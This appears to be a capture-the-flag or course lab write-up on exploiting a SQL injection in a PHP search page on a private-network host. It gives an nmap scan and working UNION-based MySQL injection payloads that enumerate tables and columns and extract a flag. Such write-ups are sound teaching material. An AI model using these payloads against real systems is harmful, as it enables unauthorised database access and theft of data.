# de3b1c_database_hacking


The first step is to find the vuln input that may be used to inject SQL code. We can use `sqlmap` to find the vuln input.

The database is MySQL.
```
nmap -p- -A -o scan_result.txt 10.0.2.197
3306/tcp open  mysql
```

According to the course description, de3b1c is in the `http://10.0.2.197/php/recherche_old.php` page.

Now, let's build different payloads to find the vuln input.
```
# the input results in an server error
# to be honest, -- is a also comment symbol, but here, it doesn't work. So # is used.
' or 1=1 --

SELECT DISTINCT usID, usPseudo, usNom , usAvecPhoto FROM users WHERE usNom LIKE '%' or 1 = 1 --%'

# but the following payload works
# the reason is https://blog.raw.pm/en/sql-injection-mysql-comment/
# -- comment style requires the second dash to be followed by at least one whitespace or control character 
' or 1=1 -- +

```

Now, we know what exact sql will be executed.

```
# get the current database name
jinjia%' union select 1,Database(),4,4  #

# get all table names
jinjia%' union select 1,table_name,table_schema,4 from information_schema.tables where table_schema= 'cuiteur' #

# get column names of table flags
jinjia%' union select 1,column_name,4,4 from information_schema.columns where table_name="flags" #

# get flag
jinjia%' union select 1,flag_id,flag,4 from flags  #

flag{de3b1c24f408fa53d40b900b9cf28af3bfddccf3252e1a}
```